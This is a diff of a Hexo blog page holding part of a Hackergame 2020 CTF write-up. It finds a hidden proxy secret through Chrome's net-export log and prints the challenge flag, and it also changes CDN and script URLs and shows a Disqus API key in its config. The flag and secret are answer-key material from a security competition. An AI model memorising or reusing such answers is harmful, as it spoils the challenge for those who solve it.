 <h2 id="找到secret"><a href="#找到secret" class="headerlink" title="找到secret"></a>找到secret</h2><p>使用谷歌浏览器自带的<code>net-export</code>功能</p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-7.png" alt="net-export"></p>
+<p><img data-src="/images/hackergame2020-7.png" alt="net-export"></p>
 <p>开启记录后我们用<span class="exturl" data-url="aHR0cHM6Ly9uZXRsb2ctdmlld2VyLmFwcHNwb3QuY29tLw==">这个工具<i class="fa fa-external-link-alt"></i></span>查看一下我们的访问记录</p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-7.1.png" alt="net-log"></p>
+<p><img data-src="/images/hackergame2020-7.1.png" alt="net-log"></p>
 <p>发现了一个神秘地址，拼接后访问可以看到</p>
 <blockquote>
 <p>Notice: secret: 7374a29dc1 ! Please use this secret to access our proxy.(flag1: flag{d0_n0t_push_me} )</p>
@@ -513,13 +499,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">36k</span>
+    <span title="站点总字数">40k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">59 分钟</span>
+    <span title="站点阅读时长">1:06</span>
   </span>
 </div>
   <div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
@@ -529,9 +515,9 @@
   </footer>
 
   
-  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script>
 var pjax = new Pjax({
   selectors: [
@@ -596,9 +582,6 @@ document.addEventListener('pjax:success', () => {
 
   
 
-  <div style="display: none;">
-    <script data-pjax src="//s95.cnzz.com/z_stat.php?id=1278724440&web_id=1278724440"></script>
-  </div>
 
 
     <div class="pjax">
@@ -606,11 +589,11 @@ document.addEventListener('pjax:success', () => {
   
 
 
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css">
 
 <script>
 NexT.utils.loadComments('#disqus_thread', () => {
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js', () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js', () => {
     window.dsqjs = new DisqusJS({
       api       : 'https://disqus.skk.moe/disqus/' || 'https://disqus.com/api/',
       apikey    : 'pwCicQgBQmc1ZEUP8fbsECJ1H1U5HWHEuUKbFFR0whF6VjLgL5CneiwMFOtQwwAv',
